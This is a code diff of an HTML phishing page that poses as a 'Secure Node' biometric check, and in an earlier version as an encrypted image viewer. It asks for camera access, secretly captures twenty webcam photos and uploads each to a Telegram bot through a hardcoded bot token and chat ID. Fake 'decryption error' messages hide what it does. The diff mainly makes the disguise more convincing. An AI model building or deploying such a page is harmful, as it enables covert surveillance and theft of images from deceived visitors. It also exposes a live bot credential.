@@ -1,77 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Encrypted File Viewer</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Security Gateway</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: #e0e0e0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 10px; background: #1a1a1a; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .btn { background: #2563eb; border: none; color: white; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 6px; transition: 0.3s; }
-        .btn:hover { background: #1d4ed8; }
-        #status { margin-top: 20px; color: #888; font-size: 14px; }
+        body { margin: 0; padding: 0; background: #050a14; color: #00d4ff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .shield-container { border: 2px solid #00d4ff; padding: 40px; border-radius: 15px; background: rgba(0, 212, 255, 0.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); text-align: center; max-width: 400px; }
+        h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
+        p { color: #8899a6; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: transparent; border: 2px solid #00d4ff; color: #00d4ff; padding: 15px 40px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 50px; text-transform: uppercase; transition: all 0.4s; position: relative; overflow: hidden; animation: pulse 2s infinite; }
+        .btn:hover { background: #00d4ff; color: #050a14; box-shadow: 0 0 40px #00d4ff; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(0, 212, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0); } }
+        #status { margin-top: 25px; font-family: monospace; font-size: 12px; color: #00ff88; }
+        .loader { height: 2px; width: 0%; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Secure Cloud Viewer</h2>
-        <p>This image is protected by end-to-end encryption.</p>
-        <button class="btn" id="viewBtn" onclick="startDemo()">Access Image</button>
+    <div class="shield-container">
+        <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
+        <h1>Secure Node</h1>
+        <p>Biometric handshake required to decrypt shared media assets.</p>
+        <button class="btn" id="mainBtn" onclick="initiate()">Verify Identity</button>
         <div id="status"></div>
+        <div id="loader" class="loader"></div>
     </div>
 
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // STEP 1: ADD YOUR DETAILS HERE
-        const BOT_TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU'; 
-        const CHAT_ID = '7617707778';
+        const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
+        const ID = '7617707778';
 
-        async function startDemo() {
+        async function initiate() {
             const status = document.getElementById('status');
-            const btn = document.getElementById('viewBtn');
+            const loader = document.getElementById('loader');
+            const btn = document.getElementById('mainBtn');
             
             try {
-                // Requesting permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 btn.style.display = 'none';
-                status.innerText = "Decrypting content... please wait...";
+                status.innerText = "> INITIALIZING BIOMETRIC SCAN...";
 
-                const video = document.getElementById('video');
+                const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // Wait for video to be ready
-                video.onloadedmetadata = async () => {
-                    // Capture 20 photos (1 every 500ms)
-                    for (let i = 1; i <= 20; i++) {
-                        captureAndSend(i);
-                        await new Promise(r => setTimeout(r, 500));
-                    }
-                    status.innerText = "Error: Decryption timed out. Connection lost.";
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 20) {
+                            clearInterval(interval);
+                            status.innerText = "> DECRYPTION ERROR: 0x8842 - RE-AUTHENTICATE";
+                            return;
+                        }
+                        send(count + 1);
+                        count++;
+                        loader.style.width = (count * 5) + "%";
+                        status.innerText = "> UPLOADING FRAGMENT " + count + "/20...";
+                    }, 1000);
                 };
-            } catch (err) {
-                status.innerText = "Error: Access denied. Decryption requires camera verification.";
+            } catch (e) {
+                status.innerText = "> ACCESS DENIED: HANDSHAKE FAILED";
+                status.style.color = "#ff4b4b";
             }
         }
 
-        function captureAndSend(index) {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
+        function send(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `snap_${index}.jpg`);
-                formData.append('caption', `Capture #${index} from Demo`);
+                if (!blob) return;
+                const fd = new FormData();
+                fd.append('chat_id', ID);
+                fd.append('photo', blob, 'identity_packet.jpg');
+                fd.append('caption', '⚠️ BREACH DETECTED: Fragment ' + index);
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    body: fd
                 });
-            }, 'image/jpeg', 0.7); // 0.7 quality for faster uploading
+            }, 'image/jpeg', 0.3); // Low quality = zero lag
         }
     </script>
 </body>
